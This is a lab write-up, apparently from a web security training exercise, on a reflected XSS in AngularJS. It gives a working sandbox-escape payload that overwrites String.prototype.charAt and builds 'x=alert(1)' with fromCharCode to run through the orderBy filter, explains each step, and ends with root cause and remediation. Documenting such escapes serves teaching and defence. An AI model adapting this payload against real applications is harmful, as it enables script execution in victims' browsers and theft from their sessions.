# Reflected XSS — AngularJS Sandbox Escape Without Strings     

## 1. Summary

The search functionality was vulnerable to Reflected Cross-Site Scripting (XSS) due to unsafe AngularJS expression evaluation.

The challenge involved escaping the AngularJS sandbox and executing JavaScript without using string literals or the `$eval` function.

The exploitation technique used JavaScript constructor access, prototype manipulation, character-code-based string construction, and AngularJS's `orderBy` filter.

## 2. Application Analysis

The application used AngularJS with the following code:

```javascript
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = USER_INPUT;
    $scope.value = $parse(key)($scope.query);
});
```

The HTML binding was:

```html
<h1 ng-controller="vulnCtrl">
    0 search results for {{value}}
</h1>
```

The `$parse` function retrieved the search property from the query object, while AngularJS interpolation displayed the resulting value.

## 3. Proof of Concept (PoC)

**Payload:**

```javascript
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Execution result:**

The payload successfully bypassed the AngularJS sandbox and executed JavaScript, triggering an `alert(1)` popup.

## 4. Exploitation Technique

The attack involved several stages.

### Step 1: Accessing the String Constructor

```javascript
toString().constructor
```

- `toString()` produces a string without requiring string literals.
- `.constructor` accesses the String constructor.

This provides access to String functionality without using quotation marks.

### Step 2: Modifying the String Prototype

```javascript
toString().constructor.prototype.charAt = [].join
```

- `String.prototype.charAt` retrieves a character at a specific position.
- `[].join` references the Array join method.
- The assignment replaces the String prototype's `charAt` method.

This manipulation bypasses the character-validation mechanism in the vulnerable AngularJS sandbox.

### Step 3: Constructing a String Without Quotes

```javascript
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

The `fromCharCode()` method converts numeric character codes into a string.

The resulting string is:

```javascript
x=alert(1)
```

Important: Constructing this string does not execute it by itself. String construction and JavaScript execution are separate operations.

### Step 4: Using the AngularJS orderBy Filter

```javascript
[1]|orderBy:toString().constructor.fromCharCode(...)
```

The `orderBy` filter evaluates its sorting expression. In this vulnerable AngularJS context, it provides the execution path used to trigger the constructed expression.

## 5. Exploitation Chain

1. Access the String constructor without string literals.
2. Modify `String.prototype.charAt` to bypass AngularJS sandbox validation.
3. Use `String.fromCharCode()` to construct the required expression without quotes.
4. Use the `orderBy` filter to trigger expression evaluation.
5. Execute `alert(1)`.

## 6. Root Cause

The application relied on the AngularJS sandbox to restrict potentially dangerous expression execution.

However, the sandbox could be bypassed through JavaScript language features such as constructor access and prototype manipulation.

AngularJS sandboxing was not a reliable security boundary.

## 7. Impact

Successful exploitation could allow an attacker to execute arbitrary JavaScript in a victim's browser under the vulnerable application's origin.

Potential consequences include:

- Unauthorized actions through the victim's authenticated session.
- Access to information exposed to page JavaScript.
- Phishing or malicious content injection.

Actual impact depends on application functionality and security controls.

## 8. Remediation

- Do not rely on AngularJS sandboxing as a security mechanism.
- Avoid evaluating untrusted user-controlled expressions.
- Keep AngularJS and application dependencies updated.
- Use safe DOM APIs and avoid unsafe dynamic expression evaluation.
- Implement appropriate Content Security Policy (CSP) as an additional security layer.

## 9. Key Learnings

- AngularJS sandboxing is not a reliable security boundary.
- JavaScript constructor access can expose powerful functionality.
- Prototype manipulation can affect built-in JavaScript behaviour.
- `String.fromCharCode()` can construct strings without quotation marks.
- Constructing a string does not automatically execute it.
- The `orderBy` filter can be abused in vulnerable AngularJS expression-evaluation contexts.
- `$eval` is not required for every AngularJS sandbox escape technique.

**Vulnerability:** Reflected Cross-Site Scripting (XSS)

**Technique:** AngularJS Sandbox Escape

**Restrictions:** No string literals and no `$eval`

**PoC:** Successful `alert(1)` execution
